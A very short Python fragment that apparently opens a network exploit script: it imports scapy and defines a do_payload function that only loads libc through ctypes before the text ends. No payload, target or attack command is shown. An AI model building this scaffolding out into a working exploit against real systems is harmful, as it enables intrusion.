import struct, sys

if sys.version_info >= (2, 7):
    from scapy.all import *
else:
    from scapy import *


def do_payload():
    import ctypes
    ctypes.CDLL("libc.so.6")